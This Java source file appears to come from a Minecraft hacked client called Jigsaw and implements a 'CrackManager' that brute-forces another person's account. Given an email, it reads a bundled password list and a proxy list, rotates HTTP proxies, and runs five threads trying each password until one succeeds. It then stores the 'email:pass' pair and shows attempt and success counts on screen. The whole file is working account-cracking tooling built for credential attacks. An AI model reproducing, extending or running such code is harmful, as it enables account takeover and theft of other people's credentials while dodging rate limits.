package me.robbanrobbin.jigsaw.cracker;

import java.io.File;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.io.FileUtils;

import me.robbanrobbin.jigsaw.client.main.Jigsaw;
import me.robbanrobbin.jigsaw.gui.ScreenPos;
import net.minecraft.client.Minecraft;

public class CrackManager {

	private Minecraft mc = Minecraft.getMinecraft();
	public boolean isCracking = false;
	public AccountCracker cracker;
	public List<String> passwords;
	public List<String> proxies;
	private int passIndex = 0;
	private int proxIndex = 0;
	public int tries = 0;
	private ArrayList<String> cracked = new ArrayList<String>();
	public String emailPass = null;
	public volatile boolean stop = false;
	public volatile boolean hacked = false;
	public int badProxies = 0;

	public synchronized Proxy nextProxy() {
		if (proxIndex >= proxies.size()) {
			proxIndex = 0;
		}
		String[] split = proxies.get(proxIndex).split(":");
		proxIndex++;
		String ip = split[0];
		int port = Integer.parseInt(split[1]);
		return new Proxy(Type.HTTP, new InetSocketAddress(ip, port));
	}

	public synchronized String nextPassword() {
		if (passIndex >= passwords.size()) {
			stop = true;
			isCracking = false;
			reset();
			return null;
		}
		String pass = passwords.get(passIndex);
		passIndex++;
		return pass;
	}

	public void startCracking(final String email) {
		cracker = new AccountCracker();
		cracker.setEmail(email);
		reset();
		isCracking = true;
		stop = false;
		for (int i = 0; i < 5; i++) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					do {
						boolean success = false;
						String pass = nextPassword();
						if(stop) {
							break;
						}
						try {
							success = cracker.tryAccount(pass);
						} catch (Exception e) {
							e.printStackTrace();
							stop = true;
							break;
						}
						if (success) {
							cracked.add(email + ":" + pass);
							emailPass = email + ":" + pass;
							hacked = true;
							isCracking = false;
							stop = true;
							break;
						} else {

						}
					} while (!stop);
					Jigsaw.getCrackManager().reset();
				}
			}).start();
		}
	}

	public void reset() {
		passIndex = 0;
		proxIndex = 0;
		isCracking = false;
		tries = 0;
		badProxies = 0;
		hacked = false;
		stop = true;
		emailPass = null;
	}

	public void initLists() {
		String path = "/me/robbanrobbin/assets/cracker/passlist.txt";
		URL url = getClass().getResource(path);
		try {
			File file = new File(url.toURI());
			passwords = FileUtils.readLines(file, Charset.forName("UTF-8"));
		} catch (URISyntaxException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

		path = "/me/robbanrobbin/assets/cracker/proxies3.txt";
		url = getClass().getResource(path);
		try {
			File file = new File(url.toURI());
			proxies = FileUtils.readLines(file, Charset.forName("UTF-8"));
		} catch (URISyntaxException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void onUpdate() {

	}

	public void onGui() {
		if (mc.currentScreen == null) {
			Jigsaw.getUIRenderer().addToQueue("§6Crack §rattempts: " + tries, ScreenPos.LEFTUP);
			Jigsaw.getUIRenderer().addToQueue("§6Crack §rbad proxies: " + badProxies, ScreenPos.LEFTUP);
			Jigsaw.getUIRenderer().addToQueue("§6Crack §rfinished: " + stop, ScreenPos.LEFTUP);
			Jigsaw.getUIRenderer().addToQueue("§6Crack §rsuccess: " + hacked, ScreenPos.LEFTUP);
		}
	}
}
